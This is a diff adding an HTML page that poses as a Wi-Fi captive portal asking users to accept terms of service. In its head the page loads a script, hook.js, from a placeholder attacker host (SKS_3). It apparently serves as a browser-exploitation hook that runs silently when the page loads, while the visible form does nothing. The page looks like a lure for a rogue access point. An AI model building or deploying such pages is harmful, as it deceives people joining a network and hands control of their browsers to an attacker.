@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Captive Portal</title>
+  <script src="http://SKS_3:80/hook.js"></script>
+  <style>
+    body {
+  background-color: #f1f1f1;
+  font-family: Arial, sans-serif;
+}
+
+h1 {
+  text-align: center;
+  color: #333;
+}
+
+p {
+  margin: 0 auto;
+  width: 50%;
+  text-align: center;
+  color: #666;
+}
+
+form {
+  margin: 0 auto;
+  width: 50%;
+  text-align: center;
+}
+
+label {
+  color: #999;
+  font-size: 14px;
+  font-weight: normal;
+}
+
+button {
+  background-color: #4CAF50;
+  border: none;
+  color: white;
+  padding: 15px 32px;
+  text-align: center;
+  text-decoration: none;
+  display: inline-block;
+  font-size: 16px;
+  margin: 4px 2px;
+  cursor: pointer;
+}
+
+button:disabled {
+  background-color: #ccc;
+  color: #666;
+  cursor: default;
+}
+
+  </style>
+</head>
+<body>
+  <h1>Welcome to Our Network</h1>
+  <p>Before you can access the internet, please agree to our terms of service by checking the box below:</p>
+  <form action="#">
+    <input type="checkbox" id="tos-checkbox" required>
+    <label for="tos-checkbox">I agree to the terms of service</label>
+    <br>
+    <button type="submit">Continue</button>
+  </form>
+</body>
+</html>
